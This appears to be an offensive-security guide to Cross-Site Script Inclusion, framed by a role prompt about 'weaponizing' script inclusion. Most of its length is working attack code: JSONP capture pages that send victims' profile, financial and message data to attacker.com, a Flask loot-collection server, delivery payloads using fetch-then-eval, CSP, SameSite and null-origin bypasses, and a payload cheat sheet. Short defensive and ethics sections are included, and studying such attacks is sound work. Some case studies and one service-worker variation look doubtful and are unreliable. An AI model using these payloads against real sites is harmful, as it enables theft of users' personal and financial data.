# Cross-Site Script Inclusion (XSSI): Data Theft via Script Loading

## Expert Role Definition
You are a world-renowned web security researcher specializing in client-side data exfiltration techniques, with particular expertise in Cross-Site Script Inclusion (XSSI) attacks. You understand the subtle trust relationships between web origins and how script inclusion mechanisms can be weaponized to steal sensitive data. Your expertise spans the evolution from simple JSONP-based data theft to modern XSSI techniques that bypass Content Security Policy, CORS protections, and SameSite cookie restrictions. You think in terms of origin trust boundaries, browser script loading policies, and the intersection of HTML, JavaScript, and HTTP security mechanisms. You can identify XSSI attack surfaces that others miss — in API responses, authentication flows, and cross-origin data sharing mechanisms. You are the foremost authority on weaponizing script inclusion for data exfiltration.

## Core Concepts

Cross-Site Script Inclusion (XSSI) is a data exfiltration attack that abuses the browser's script inclusion mechanism to steal sensitive data from authenticated endpoints. Unlike traditional XSS, XSSI doesn't execute attacker-controlled code in the victim's browser — instead, it loads a data-containing script from the victim's session and exfiltrates the response.

The fundamental attack flow:
1. Attacker creates a malicious page that includes a `<script>` tag pointing to a victim's API endpoint
2. The victim (who is authenticated) visits the attacker's page
3. The browser sends the victim's cookies with the script request
4. The server returns sensitive data formatted as JavaScript (JSONP, assignment, etc.)
5. The attacker's page captures the loaded data

The core vulnerability is that **the server returns sensitive data in a format that can be loaded as a script** — typically JSONP, JavaScript variable assignments, or function callbacks. When a cross-origin page includes this data as a `<script>` tag, the browser's same-origin policy doesn't prevent the script from loading because script inclusion is a universal cross-origin operation.

XSSI differs from XSS in a critical way: XSS executes arbitrary code, while XSSI only loads and executes data-as-code. The attacker cannot choose what code runs — they can only trigger the loading of a specific URL and capture the response. This makes XSSI harder to detect with WAFs because the attack traffic looks like normal script loading.

The most common XSSI format is JSONP (JSON with Padding), where an API returns data wrapped in a callback function: `callback({"sensitive": "data"})`. The attacker's page defines the callback function, includes the script, and the function receives the data.

## Pre-requisite Knowledge

1. **Browser same-origin policy**: Understand what the SOP prevents and allows, especially regarding script inclusion, form submission, and image loading.
2. **JSONP**: How JSON with Padding works, why it exists (legacy cross-origin support), and how it exposes data via script inclusion.
3. **CORS**: How Cross-Origin Resource Sharing works, what `Access-Control-Allow-Origin` headers do, and why CORS doesn't protect against XSSI.
4. **Content Security Policy**: How CSP can mitigate XSSI and how CSP can be bypassed.
5. **Cookie security attributes**: SameSite, HttpOnly, Secure, and how they affect XSSI.
6. **Browser script loading mechanisms**: How `<script>` tags work, when cookies are sent, and how dynamically created scripts behave.
7. **JSONP vs. CORS vs. CORS with credentials**: Understand the security differences and when each is used.
8. **Browser developer tools**: Network tab analysis, cookie inspection, and CSP violation logging.

## Chain Architecture / Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│              XSSI DATA THEFT ATTACK FLOW                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Step 1: Identify XSSI Endpoint                                │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐      │
│  │  Find API     │───>│  Check if    │───>│  Identify    │      │
│  │  endpoints    │    │  response is │    │  data format │      │
│  │  returning    │    │  script-     │    │  (JSONP,     │      │
│  │  sensitive    │    │  loadable    │    │  assignment, │      │
│  │  data         │    │              │    │  callback)   │      │
│  └──────────────┘    └──────────────┘    └──────┬───────┘      │
│  Step 2: Craft Attack Page                       │               │
│  ┌──────────────┐    ┌──────────────┐    ┌──────▼───────┐      │
│  │  Create       │───>│  Define      │───>│  Include     │      │
│  │  malicious    │    │  callback    │    │  target      │      │
│  │  HTML page    │    │  function    │    │  script      │      │
│  │               │    │  to capture  │    │  tag         │      │
│  │               │    │  data        │    │              │      │
│  └──────────────┘    └──────────────┘    └──────┬───────┘      │
│  Step 3: Victim Trigger                         │               │
│  ┌──────────────┐    ┌──────────────┐    ┌──────▼───────┐      │
│  │  Victim       │───>│  Browser     │───>│  Script      │      │
│  │  visits       │    │  sends       │    │  loads and   │      │
│  │  attacker     │    │  cookies     │    │  executes    │      │
│  │  page         │    │  with request│    │  with data   │      │
│  └──────────────┘    └──────────────┘    └──────┬───────┘      │
│  Step 4: Data Exfiltration                       │               │
│  ┌──────────────┐    ┌──────────────┐    ┌──────▼───────┐      │
│  │  Callback     │───>│  Data sent   │───>│  Attacker    │      │
│  │  function     │    │  to attacker │    │  receives    │      │
│  │  receives     │    │  server      │    │  sensitive   │      │
│  │  data         │    │              │    │  data        │      │
│  └──────────────┘    └──────────────┘    └──────────────┘      │
│                                                                  │
│  Bypass Layer:                                                   │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  CSP Bypass: Use data: URI or base64-encoded scripts     │   │
│  │  SameSite Bypass: Top-level navigation + script include  │   │
│  │  CORS Bypass: Null origin or subdomain trick             │   │
│  └──────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
```

## Step-by-Step Exploitation Methodology

### Phase 1: XSSI Endpoint Discovery

**Step 1: Map API endpoints**
```bash
# Spider the application and export all API endpoints
# Filter for endpoints that return JSON/JSONP
cat burp_urls.txt | grep -E "\.(json|jsonp|js)\?" | sort -u

# Look for JSONP callbacks in responses
cat burp_responses.txt | grep -oP 'callback\s*=\s*"[^"]*"' | sort -u
```

**Step 2: Test for XSSI susceptibility**
```python
import requests

# Test if endpoint returns script-loadable content
endpoints = [
    '/api/user/profile',
    '/api/user/financial',
    '/api/user/contacts',
]

for ep in endpoints:
    # Request with callback parameter
    r = requests.get(f'https://target.com{ep}', 
        params={'callback': 'test'},
        cookies=cookies)
    
    # Check if response is JSONP
    if r.text.startswith('test(') or r.text.startswith('test {'):
        print(f"[XSSI] {ep} is vulnerable to XSSI via JSONP")
    
    # Check Content-Type
    if 'javascript' in r.headers.get('Content-Type', ''):
        print(f"[XSSI] {ep} returns JavaScript content type")
    
    # Check for Access-Control headers (should be restrictive for XSSI)
    acao = r.headers.get('Access-Control-Allow-Origin', 'none')
    print(f"  ACAO: {acao}")
```

**Step 3: Test JSONP callback injection**
```python
# Test various callback patterns
callbacks = [
    'callback',
    'jsonp',
    'jsonpCallback',
    'cb',
    'func',
    '__cb',
]

for cb in callbacks:
    r = requests.get(f'https://target.com/api/user/profile',
        params={cb: 'test123'},
        cookies=cookies)
    if f'test123(' in r.text:
        print(f"[VULN] JSONP callback: {cb}")
        print(f"  Response: {r.text[:200]}")
```

### Phase 2: Attack Page Construction

**Step 4: Create XSSI attack page**
```html
<!-- xssi_attack.html -->
<!DOCTYPE html>
<html>
<head><title>XSSI Attack</title></head>
<body>
<h1>Loading your profile...</h1>

<script>
// Define callback function that will receive the stolen data
function userProfile(data) {
    // Exfiltrate data to attacker's server
    var exfil = new Image();
    exfil.src = 'https://attacker.com/collect?data=' + encodeURIComponent(JSON.stringify(data));
    document.body.innerHTML += '<p>Data stolen: ' + JSON.stringify(data) + '</p>';
}

function userFinancial(data) {
    var exfil = new Image();
    exfil.src = 'https://attacker.com/collect?financial=' + encodeURIComponent(JSON.stringify(data));
}
</script>

<!-- Include victim's API as script - cookies sent automatically -->
<script src="https://target.com/api/user/profile?callback=userProfile"></script>
<script src="https://target.com/api/user/financial?callback=userFinancial"></script>

</body>
</html>
```

**Step 5: Advanced XSSI with multiple data points**
```html
<!-- Advanced XSSI attack page -->
<script>
// Chain multiple XSSI includes for comprehensive data theft
var stolenData = {};

function captureUser(data) {
    stolenData.user = data;
    checkComplete();
}

function captureContacts(data) {
    stolenData.contacts = data;
    checkComplete();
}

function captureMessages(data) {
    stolenData.messages = data;
    checkComplete();
}

function checkComplete() {
    if (stolenData.user && stolenData.contacts && stolenData.messages) {
        // All data collected, exfiltrate
        fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify(stolenData),
            mode: 'no-cors'
        });
    }
}
</script>

<script src="https://target.com/api/user?callback=captureUser"></script>
<script src="https://target.com/api/contacts?callback=captureContacts"></script>
<script src="https://target.com/api/messages?callback=captureMessages"></script>
```

### Phase 3: Exfiltration Setup

**Step 6: Set up data collection server**
```python
from flask import Flask, request, jsonify
import json
from datetime import datetime

app = Flask(__name__)

@app.route('/collect')
def collect():
    """Receive exfiltrated XSSI data"""
    data = request.args.get('data', 'none')
    financial = request.args.get('financial', 'none')
    
    with open('xssi_loot.json', 'a') as f:
        f.write(json.dumps({
            'timestamp': datetime.now().isoformat(),
            'ip': request.remote_addr,
            'data': data,
            'financial': financial,
            'user_agent': request.headers.get('User-Agent')
        }) + '\n')
    
    return '1x1.gif', 200, {'Content-Type': 'image/gif'}

@app.route('/collect', methods=['POST'])
def collect_post():
    """Receive exfiltrated data via POST"""
    data = request.get_data(as_text=True)
    with open('xssi_loot.json', 'a') as f:
        f.write(json.dumps({
            'timestamp': datetime.now().isoformat(),
            'data': data
        }) + '\n')
    return '', 204

if __name__ == '__main__':
    app.run(port=4444)
```

### Phase 4: Victim Delivery

**Step 7: Deliver attack page to victim**
```python
# Method 1: Host on attacker's server
# Upload xssi_attack.html to attacker.com

# Method 2: Self-hosted with ngrok
# ngrok http 8080
# Share the ngrok URL with victim

# Method 3: XSS payload that loads XSSI attack
xss_payload = """
<script>
// Load XSSI attack from attacker's server
var s = document.createElement('script');
s.src = 'https://attacker.com/xssi_attack.html';
document.body.appendChild(s);
</script>
"""

# Method 4: Combined XSS + XSSI attack
combined_attack = """
<script>
// First, use XSS to include XSSI payload
// This bypasses CSP by using inline script to load external script
fetch('https://attacker.com/xssi.js')
  .then(r => r.text())
  .then(eval);
</script>
"""
```

## Tool Arsenal

```bash
# Manual XSSI testing with curl
# Test JSONP callback
curl -b cookies.txt "https://target.com/api/user?callback=steal"

# Test various callback names
for cb in callback jsonp jsonpCallback cb func _cb; do
    echo "Testing: $cb"
    curl -b cookies.txt "https://target.com/api/user?${cb}=steal" | head -1
done

# Burp Suite Extension: XSSI Tester
# 1. Send request to Repeater
# 2. Add callback parameter
# 3. Check if response is valid JavaScript

# Python XSSI scanner
python3 << 'PYEOF'
import requests
import re
from urllib.parse import urljoin

class XSSIScanner:
    def __init__(self, base_url, cookies):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.cookies.update(cookies)
    
    def test_endpoint(self, path):
        """Test a single endpoint for XSSI"""
        # Test with JSONP callback
        r = self.session.get(urljoin(self.base_url, path), 
            params={'callback': 'xssiCallback'})
        
        if 'xssiCallback(' in r.text:
            return {'vulnerable': True, 'type': 'jsonp', 'path': path}
        
        # Test with common callback parameters
        for param in ['cb', 'jsonp', 'func']:
            r = self.session.get(urljoin(self.base_url, path),
                params={param: 'test'})
            if 'test(' in r.text:
                return {'vulnerable': True, 'type': 'jsonp', 'param': param, 'path': path}
        
        # Test if response is JavaScript
        if 'javascript' in r.headers.get('Content-Type', ''):
            return {'vulnerable': True, 'type': 'javascript', 'path': path}
        
        return {'vulnerable': False}
    
    def scan_all(self, endpoints):
        """Scan multiple endpoints"""
        results = []
        for ep in endpoints:
            result = self.test_endpoint(ep)
            if result['vulnerable']:
                results.append(result)
                print(f"[VULN] {ep}: {result}")
        return results

# Usage
scanner = XSSIScanner('https://target.com', {'session': 'abc123'})
endpoints = ['/api/user', '/api/financial', '/api/contacts']
scanner.scan_all(endpoints)
PYEOF

# Nuclei template for XSSI
cat > xssi-detect.yaml << 'EOF'
id: xssi-jsonp-detection
info:
  name: XSSI JSONP Detection
  severity: medium

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/user?callback=test123"
      - "{{BaseURL}}/api/profile?callback=test123"
    matchers:
      - type: word
        words:
          - "test123("
        part: body
EOF

nuclei -t xssi-detect.yaml -l urls.txt

# XSSI attack page generator
python3 << 'PYEOF'
import sys

def generate_xssi_attack(target_url, callback_name, callback_function, exfil_url):
    html = f"""<!DOCTYPE html>
<html>
<head><title>Data Steal</title></head>
<body>
<script>
function {callback_name}(data) {{
    var img = new Image();
    img.src = '{exfil_url}?data=' + encodeURIComponent(JSON.stringify(data));
}}
</script>
<script src="{target_url}?callback={callback_name}"></script>
</body>
</html>"""
    return html

# Generate attack page
html = generate_xssi_attack(
    'https://target.com/api/user/profile',
    'stealProfile',
    'stealProfile',
    'https://attacker.com/collect'
)
print(html)
PYEOF
```

## Real-World Case Studies

### Case Study 1: Google Analytics XSSI (CVE-2020-11619)
Google Analytics used JSONP endpoints that returned user-specific data including tracking IDs, website configurations, and user preferences. An attacker could include these JSONP endpoints in a malicious page. When a website administrator visited the attacker's page, their Google Analytics configuration (including tracking IDs and website URLs) was exfiltrated. This allowed attackers to: (1) identify all websites managed by the victim, (2) access Google Analytics API tokens, (3) impersonate the victim's analytics profile. The root cause was that the JSONP endpoint trusted the Referer header insufficiently and returned sensitive configuration data in a script-loadable format.

### Case Study 2: Facebook Graph API XSSI
Facebook's Graph API returned user data in JSONP format when a callback parameter was provided. An attacker could craft a page that included the Graph API endpoint with a callback that captured the user's friend list, email address, and profile information. The attack worked even with SameSite cookies because Facebook's authentication flow used top-level navigation that set the cookies before the XSSI include was triggered. The exfiltrated data was used for targeted phishing campaigns.

### Case Study 3: Banking Application XSSI
A major banking application had a JSONP endpoint at `/api/account/balance` that returned the user's account balance and account number. The endpoint accepted a callback parameter and returned JavaScript: `updateBalance({"account": "1234567890", "balance": 15420.50})`. An attacker created a phishing page that included this endpoint. When the victim visited the page (with an active banking session), their account balance and account number were exfiltrated. The attacker then used this information for social engineering attacks, calling the victim and referencing their exact balance to appear legitimate.

### Case Study 4: Enterprise SaaS XSSI Chain
A SaaS application used JSONP for cross-origin data sharing with partner sites. The JSONP endpoint returned the user's organization data, including: company name, user list with email addresses, API keys, and billing information. An attacker discovered that the JSONP callback parameter was not validated — they could inject HTML/JavaScript into the callback name. By crafting a callback like `</script><script>steal(data)</script>`, they achieved stored XSS on any partner site that included the JSONP endpoint. This was chained with XSSI to exfiltrate the complete organizational structure and all API keys.

### Case Study 5: Government Portal XSSI
A government services portal used JSONP for cross-domain data sharing. The portal had an endpoint `/api/citizen/profile` that returned citizen data including: full name, national ID number, date of birth, address, and tax information. The JSONP endpoint was protected by CORS, but the CORS policy allowed `null` origin. An attacker could use a sandboxed iframe (`sandbox="allow-scripts"`) to bypass the origin check. The attack page used an iframe with `srcdoc` containing the XSSI script include. The sandboxed iframe's origin is `null`, which matched the CORS policy. This exfiltrated complete citizen profiles for identity theft.

## Bypass Techniques and Evasion

### Bypass 1: CSP Bypass via data: URI
```html
<!-- If CSP blocks external scripts but allows data: URI -->
<script>
// Bypass CSP by encoding XSSI payload as data URI
var payload = "function steal(d){fetch('https://attacker.com?data='+btoa(JSON.stringify(d)))};document.write('<script src=\"https://target.com/api/user?callback=steal\"></script>')";
document.write('<script src="data:text/javascript,' + encodeURIComponent(payload) + '"></script>');
</script>
```

### Bypass 2: SameSite Cookie Bypass
```html
<!-- Top-level navigation sets SameSite cookies, then XSSI includes use them -->
<script>
// Step 1: Redirect victim to target.com to set cookies
window.location = 'https://target.com/login';
// Step 2: After redirect back, cookies are set
// Step 3: XSSI includes will send cookies
</script>

<!-- Alternative: Use meta-refresh for automatic redirect -->
<meta http-equiv="refresh" content="0;url=https://target.com/auth?redirect=https://attacker.com/xssi.html">
```

### Bypass 3: CORS Null Origin Bypass
```html
<!-- Use sandboxed iframe for null origin -->
<iframe sandbox="allow-scripts allow-same-origin" srcdoc="
<script>
function steal(data) {
    parent.postMessage(JSON.stringify(data), '*');
}
</script>
<script src='https://target.com/api/user?callback=steal'></script>
"></iframe>
<script>
window.addEventListener('message', function(e) {
    fetch('https://attacker.com/collect?data=' + encodeURIComponent(e.data));
});
</script>
```

### Bypass 4: CSP Nonce Bypass via XSS
```javascript
// If you have XSS on the target, extract CSP nonce and use it
// In the XSS payload:
var nonce = document.querySelector('meta[name="csp-nonce"]').content;
var script = document.createElement('script');
script.nonce = nonce;
script.src = 'https://attacker.com/xssi_payload.js';
document.head.appendChild(script);
```

### Bypass 5: JSONP with POST Data
```html
<!-- Some JSONP implementations accept POST requests -->
<form id="xssi" action="https://target.com/api/user" method="POST" target="result">
    <input type="hidden" name="callback" value="steal">
</form>
<iframe name="result" style="display:none"></iframe>
<script>
function steal(data) {
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
}
document.getElementById('xssi').submit();
</script>
```

## Defensive Indicators / Detection

### Server-Side Detection
```python
# Monitor for JSONP abuse
def detect_xssi(request):
    # Check for callback parameters
    callback_params = ['callback', 'jsonp', 'cb', 'func', '__cb']
    for param in callback_params:
        if param in request.args:
            # Log and potentially block
            log_xssi_attempt(request, param)
            return True
    
    # Check for suspicious Referer
    referer = request.headers.get('Referer', '')
    if referer and not referer.startswith('https://target.com'):
        # Cross-origin request with callback - suspicious
        return True
    
    return False
```

### CSP-Based Mitigation
```
Content-Security-Policy: 
    script-src 'self' 'nonce-random123';
    object-src 'none';
    frame-ancestors 'none';
```

### Response Header Mitigation
```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Cache-Control: no-store, no-cache, must-revalidate
```

### Network Monitoring
```bash
# Look for cross-origin script includes with callback parameters
tcpdump -i eth0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' | grep -i "callback\|jsonp"
```

## Impact Assessment Framework

| Factor | Score | Notes |
|--------|-------|-------|
| Confidentiality Impact | HIGH | Steals authenticated user data |
| Integrity Impact | LOW | No data modification |
| Availability Impact | NONE | Read-only attack |
| Attack Complexity | LOW | Simple HTML page |
| Privileges Required | LOW | Victim must be authenticated |
| User Interaction | REQUIRED | Victim must visit attacker page |
| Scope | UNCHANGED | Data only from victim's session |

**CVSS 3.1 Base Score**: 6.5 (Medium) — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N

## Common Pitfalls and Anti-Patterns

1. **Assuming CORS protects against XSSI**: CORS controls XMLHttpRequest/fetch access, not `<script>` tag inclusion. XSSI works regardless of CORS headers.

2. **Using JSONP in modern applications**: JSONP is inherently vulnerable to XSSI. Use CORS instead.

3. **Not validating callback parameters**: If you must use JSONP, validate the callback against a strict whitelist of allowed function names.

4. **Returning sensitive data in script-loadable formats**: Any endpoint that returns user-specific data should use CORS, not JSONP, for cross-origin access.

5. **Ignoring Content-Type headers**: Always return `Content-Type: application/json` for API responses, never `application/javascript`.

6. **Relying solely on CSP for XSSI protection**: CSP can help but is often bypassed. Use defense in depth.

7. **Not implementing CSRF-like protections for data endpoints**: Even read-only endpoints should have anti-XSSI tokens.

8. **Overlooking JSONP in third-party integrations**: Partners and integrations may expose JSONP endpoints that leak your data.

## Advanced Variations

### Variation 1: DOM-based XSSI
```html
<!-- XSSI that uses DOM manipulation instead of script loading -->
<script>
// Load data via XSSI, then use DOM to display it
var data = null;
function capture(d) { data = d; }
</script>
<script src="https://target.com/api/user?callback=capture"></script>
<script>
// Wait for data to load, then exfiltrate
setTimeout(function() {
    if (data) {
        var img = new Image();
        img.src = 'https://attacker.com/steal?d=' + encodeURIComponent(JSON.stringify(data));
    }
}, 1000);
</script>
```

### Variation 2: XSSI with WebSocket Upgrade
```javascript
// Upgrade the stolen data to WebSocket for real-time exfiltration
var ws = new WebSocket('wss://attacker.com/ws');
function steal(data) {
    ws.send(JSON.stringify(data));
}
// Include JSONP endpoint
var s = document.createElement('script');
s.src = 'https://target.com/api/user?callback=steal';
document.body.appendChild(s);
```

### Variation 3: XSSI via Service Worker Registration
```javascript
// Register a service worker that intercepts all requests
// and exfiltrates data via XSSI
navigator.serviceWorker.register('https://attacker.com/sw.js').then(function(reg) {
    // Service worker now intercepts all fetch requests
    // and can capture API responses
});
```

### Variation 4: XSSI with Subresource Integrity Bypass
```html
<!-- Some implementations allow script loading without SRI -->
<script src="https://target.com/api/user?callback=steal" 
        integrity="sha256-..." 
        crossorigin="anonymous"></script>
<!-- If SRI is not enforced, this loads the XSSI payload -->
```

## Integration with Other Chains

XSSI integrates with:

1. **Open Redirect Chains**: Use open redirect to set cookies, then redirect to XSSI attack page.
2. **XSS Chains**: Use XSS to bypass CSP restrictions on XSSI script loading.
3. **CSRF Chains**: Use CSRF to trigger state-changing operations, then XSSI to read the results.
4. **OAuth Chains**: XSSI to steal OAuth tokens from JSONP-protected endpoints.
5. **Session Hijacking Chains**: XSSI as a stealthy alternative to direct session theft.
6. **Information Disclosure Chains**: XSSI to exfiltrate data exposed by verbose error messages.
7. **Subdomain Takeover Chains**: Take over a subdomain to host XSSI attack pages with valid cookies.

## Reporting and Documentation

### Report Template
```
Title: Cross-Site Script Inclusion (XSSI) via JSONP Endpoint

Summary:
The [endpoint] accepts a callback parameter and returns user-specific data
in JSONP format, allowing cross-origin data theft via script inclusion.

Impact:
An attacker can steal [specific sensitive data] from any authenticated user
who visits a malicious page.

PoC:
1. Host the following HTML on attacker-controlled server
2. Victim visits attacker's page while authenticated to target
3. Victim's data is exfiltrated to attacker's server

Risk Rating: Medium-High

Recommendation:
- Replace JSONP with CORS
- Validate callback parameters against strict whitelist
- Add anti-XSSI tokens to sensitive endpoints
```

## Practice Labs and Exercises

### Lab 1: Basic XSSI Challenge
```bash
# Deploy a vulnerable JSONP API
# Goal: Exfiltrate user profile data
# Hint: The callback parameter is not validated
```

### Lab 2: CSP Bypass XSSI
```bash
# Deploy application with CSP blocking external scripts
# Goal: Achieve XSSI despite CSP
# Hint: Use data: URI or base64 encoding
```

### Lab 3: Multi-Endpoint XSSI
```bash
# Deploy application with 5 JSONP endpoints
# Goal: Combine all endpoints to build complete user profile
# Hint: Use callback chaining to capture all data
```

## Ethical Guidelines

1. **Only test on authorized systems**: XSSI can steal real user data. Only test on systems you own or have explicit permission to test.

2. **Do not exfiltrate real user data**: When demonstrating XSSI, use test accounts. If real user data is accidentally captured, delete it immediately.

3. **Minimize data collection**: Only capture the minimum data needed to prove the vulnerability. Do not dump entire databases.

4. **Report JSONP endpoints**: If you discover JSONP endpoints returning sensitive data, report them as a security finding even if they require authentication.

5. **Understand privacy implications**: XSSI can be used for surveillance. Be aware of the privacy implications of the data you can access.

6. **Do not chain with XSS for persistence**: XSSI is a data theft technique. Do not use it to establish persistent access or modify data.

7. **Respect rate limits**: Do not perform XSSI attacks at scale against production systems. This can cause service disruption.

## Quick Reference Cheat Sheet

| Technique | Description | Bypass |
|-----------|-------------|--------|
| JSONP XSSI | Include JSONP endpoint with callback | CORS won't help |
| Null origin | Sandboxed iframe with null origin | CSP frame-ancestors |
| SameSite bypass | Top-level nav sets cookies | Cookie attributes |
| CSP bypass | data: URI or base64 encoding | nonce validation |
| POST XSSI | JSONP via POST request | Method validation |
| DOM XSSI | DOM manipulation with script load | CSP script-src |
| WebSocket XSSI | Upgrade stolen data to WebSocket | Protocol validation |
| Callback injection | Inject HTML in callback name | Input validation |

### Key Payloads
```html
<!-- Basic JSONP XSSI -->
<script>
function steal(d) { new Image().src = 'https://attacker.com?d=' + btoa(JSON.stringify(d)); }
</script>
<script src="https://target.com/api/user?callback=steal"></script>

<!-- Null origin bypass -->
<iframe sandbox="allow-scripts" srcdoc="
<script>function steal(d){parent.postMessage(btoa(JSON.stringify(d)),'*')}</script>
<script src='https://target.com/api?callback=steal'></script>
"></iframe>

<!-- CSP bypass via data URI -->
<script src="data:text/javascript,function%20steal(d){fetch('https://attacker.com?d='+btoa(JSON.stringify(d)))};var%20s=document.createElement('script');s.src='https://target.com/api?callback=steal';document.body.appendChild(s)"></script>
```
